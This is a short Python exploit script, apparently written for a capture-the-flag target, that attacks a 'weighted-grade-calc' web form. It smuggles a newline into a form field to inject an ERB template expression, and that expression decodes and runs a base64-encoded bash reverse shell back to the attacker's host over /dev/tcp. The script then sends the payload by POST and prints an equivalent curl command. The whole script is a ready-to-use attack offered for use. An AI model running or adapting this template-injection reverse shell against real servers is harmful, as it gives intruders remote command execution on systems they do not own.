import urllib3
import base64
from urllib.parse import urlencode

REMOTE_HOST: str    = "10.10.11.253"
PATH: str           = "weighted-grade-calc"
LOCAL_HOST: str     = "10.10.16.11"
PORT: int           = 6969

payload: str        = base64.b64encode(f"0<&196; exec 196<>/dev/tcp/{LOCAL_HOST}/{PORT}; sh <&196 >&196 2>&196".encode('utf-8')).decode('utf-8')
b64_payload: str    = f"""<%= system("echo '{payload}' | base64 --decode | bash") %>"""

fields = {
    "category1"     : "a",
    "grade1"        : "10",
    "weight1"       : "10",
    "category2"     : "b",
    "grade2"        : "10",
    "weight2"       : "20",
    "category3"     : "c",
    "grade3"        : "10",
    "weight3"       : "30",
    "category4"     : "d",
    "grade4"        : "10",
    "weight4"       : "30",
    "category5"     : f"a\n{b64_payload}",
    "grade5"        : "10",
    "weight5"       : "10",
}
encoded_data = urlencode(fields)

print(f"Payload: curl 'http://{REMOTE_HOST}/weighted-grade-calc' --data-raw '{encoded_data}'")

http = urllib3.PoolManager()
resp = http.request(
    "POST",
    f"http://{REMOTE_HOST}/{PATH}",
    body=encoded_data,
)
